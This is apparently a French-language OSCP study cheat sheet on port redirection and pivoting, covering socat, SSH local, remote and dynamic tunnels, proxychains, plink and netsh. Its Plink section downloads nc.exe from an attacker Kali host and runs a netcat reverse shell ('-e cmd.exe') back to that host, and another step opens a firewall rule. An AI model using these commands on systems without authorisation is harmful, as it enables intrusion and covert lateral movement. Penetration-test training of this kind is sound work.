---
title: "OSCP · Redirection de ports"
description: "Documenter les redirections locales, distantes et dynamiques."
---

# OSCP · Redirection de ports

Documenter les redirections locales, distantes et dynamiques.


## Port Redirection with Socat

Vérifier les ports et les services de la cible autorisée.


```bash
socat -ddd TCP-LISTEN:[listening_local_port_on_dmz],fork TCP:[internal_ip]:[internal_port]
```


## SSH Local Redirection de ports

Vérifier les ports et les services de la cible autorisée.


```bash
ssh -N -L 0.0.0.0:[local_port_on_rev_shell]:[internal_ip_target]:[internal_ip_port] username@internal_host
```


## SSH Dynamic Redirection de ports

Vérifier les ports et les services de la cible autorisée.


```bash
ssh -N -D 0.0.0.0:[local_socks_proxy_port] username@internal_host
```


```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [local_socks_proxy_port]
```


```text
proxychains
```


```bash
# For example
proxychains smbclient -L //internal_ip/ -U username --password=password
```


## SSH Remote Redirection de ports

Vérifier les ports et les services de la cible autorisée.


```bash
ssh -N -R 127.0.0.1:[remote_port_on_ssh_host]:[internal_target_ip]:[internal_target_port] username@remote_host
```


## SSH Remote Dynamic Redirection de ports

Vérifier les ports et les services de la cible autorisée.


```bash
ssh -N -R [proxychains_port] username@remote_host
```


```bash
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 [proxychains_port]
```


## SSH (Windows)

Observer les permissions et la configuration de Windows.


```powershell
where ssh
ssh.exe -V
```


```powershell
ssh -N -R [REMOTE_PORT]:localhost:[LOCAL_PORT] [USER]@[REMOTE_HOST]
```


```bash
# Edit /etc/proxychains4.conf and add
[ProxyList]
socks5 127.0.0.1 [REMOTE_PORT]
```


```bash
ss -ntplu
```


## Plink (Windows)

Observer les permissions et la configuration de Windows.


```bash
sudo systemctl start apache2
```


```text
nc.exe
```


```bash
find / -name nc.exe 2>/dev/null
sudo cp [SOURCE_PATH]/nc.exe /var/www/html/
```


```text
nc.exe
```


```powershell
wget -Uri http://[KALI_IP]/nc.exe -OutFile C:\Windows\Temp\nc.exe
```


```text
nc.exe
```


```powershell
C:\Windows\Temp\nc.exe -e cmd.exe [KALI_IP] [PORT]
```


```text
plink.exe
```


```bash
find / -name plink.exe 2>/dev/null
sudo cp [SOURCE_PATH]/plink.exe /var/www/html/
```


```text
plink.exe
```


```powershell
wget -Uri http://[KALI_IP]/plink.exe -OutFile C:\Windows\Temp\plink.exe
```


```powershell
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l [USER] -pw [PASSWORD] -R [LOCAL_PORT]:127.0.0.1:[REMOTE_PORT] [KALI_IP]
```


```text
xfreerdp
```


```bash
xfreerdp /u:[USERNAME] /p:[PASSWORD] /v:127.0.0.1:[LOCAL_PORT]
```


## Netsh (Windows)

Observer les permissions et la configuration de Windows.


```text
Netsh
```


```powershell
netsh interface portproxy add v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP] connectport=[CONNECT_PORT] connectaddress=[CONNECT_IP]
```


```powershell
netstat -anp TCP | find "[LISTEN_PORT]"
```


```powershell
netsh interface portproxy show all
```


```powershell
netsh advfirewall firewall add rule name="[RULE_NAME]" protocol=TCP dir=in localip=[LISTEN_IP] localport=[LISTEN_PORT] action=allow
```


```bash
ssh [USER]@[LISTEN_IP] -p[LISTEN_PORT]
```


```powershell
netsh advfirewall firewall delete rule name="[RULE_NAME]"
```


```powershell
netsh interface portproxy del v4tov4 listenport=[LISTEN_PORT] listenaddress=[LISTEN_IP]
```


---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
